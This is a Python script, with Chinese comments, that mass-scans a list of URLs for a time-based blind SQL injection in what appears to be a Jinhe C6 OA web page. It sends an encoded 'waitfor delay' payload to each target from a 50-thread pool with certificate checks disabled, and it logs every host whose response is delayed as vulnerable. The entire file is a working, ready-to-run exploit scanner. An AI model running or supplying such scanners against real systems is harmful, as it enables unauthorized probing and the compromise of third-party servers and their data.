import requests
import threading
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Poc路径
POC_PATH = "/c6/Jhsoft.Web.AddMenu/GroupOuterRegisterAdd.aspx/?ID=%27%77%61%69%74%66%6f%72%20%64%65%6c%61%79%27%30%3a%30%3a%35%27%2d%2d"

def check_vulnerability(url):

    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        target_url = urljoin(url, POC_PATH)
        
        start_time = time.time()

        response = requests.get(
            target_url, 
            verify=False, 
            timeout=10,
            allow_redirects=False,  # 禁止自动重定向
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        response_time = time.time() - start_time
        if 300 <= response.status_code < 400:
            return f"✗ 发生跳转: {url} (状态码: {response.status_code}, 响应时间: {response_time:.2f}s)"

        if response.status_code == 200 and response_time > 5:
            # 漏洞存在，写入结果文件
            result = f"漏洞存在 - URL: {url}, 响应时间: {response_time:.2f}秒, 状态码: 200\n"
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(result)
            return f"✓ 漏洞存在: {url} (响应时间: {response_time:.2f}s)"
        else:
            return f"✗ 漏洞不存在: {url} (状态码: {response.status_code}, 响应时间: {response_time:.2f}s)"
            
    except requests.exceptions.Timeout:
        return f"✗ 请求超时: {url}"
    except requests.exceptions.ConnectionError:
        return f"✗ 连接失败: {url}"
    except requests.exceptions.RequestException as e:
        return f"✗ 请求异常 {url}: {str(e)}"
    except Exception as e:
        return f"✗ 未知错误 {url}: {str(e)}"

def main():
    """
    主函数
    """
    try:
        # 读取URL列表
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("url.txt文件中没有找到有效的URL")
            return
        
        print(f"开始检测 {len(urls)} 个URL，线程数: 50")
        print("=" * 60)
        print("注意: 3xx跳转的URL将被视为无漏洞")
        print("=" * 60)

        open('result.txt', 'w', encoding='utf-8').close()
        
        # 使用线程池并发执行
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}

            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    print(result) 
                except Exception as e:
                    print(f"✗ 任务执行异常 {url}: {str(e)}")
        
        print("=" * 60)
        print("检测完成！")
        
        try:
            with open('result.txt', 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    print("漏洞详情已保存到 result.txt")
                    print(f"发现 {len(content.splitlines())} 个存在漏洞的URL")
                else:
                    print("未发现任何漏洞")
        except:
            print("未发现任何漏洞")
            
    except FileNotFoundError:
        print("错误: 未找到 url.txt 文件")
    except Exception as e:
        print(f"程序执行错误: {str(e)}")

if __name__ == "__main__":
    main()